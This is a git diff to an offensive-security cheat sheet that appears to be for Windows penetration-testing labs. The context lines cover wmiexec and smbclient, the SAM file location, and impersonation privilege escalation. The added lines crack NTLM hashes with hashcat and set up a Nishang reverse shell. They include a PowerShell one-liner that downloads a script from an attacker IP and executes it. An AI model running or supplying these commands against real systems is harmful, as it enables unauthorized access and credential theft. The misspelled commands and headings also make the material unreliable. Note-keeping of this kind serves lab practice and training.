@@ -111,10 +111,14 @@ wmiexec USER:PASS@DOAMIN
 smbclient \\\\IP\\FOLDER -U USER
 ```
 
-
 ## SAM file path
 ```
 C:\Windows\System32\Config
+```
+
+## Crack windows hash using hashcat
+```
+hashcat -a 0 -m 1000 cred.hash rockyou.txt --force
 ```
 
 ## Imporsanate privilage escalate
@@ -133,5 +137,12 @@ getprivs
 ```
 SeImporsanatePrivilage Enable
 SeAssignPrimaryToken Enable 
+```
+
+## Use nishang script to gain reverse shell
+```
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1234
+powershell -c iex(new-object net.webclient).downloadstring(‘http://10.10.14.45:5555/shell.ps1')
 ```
 
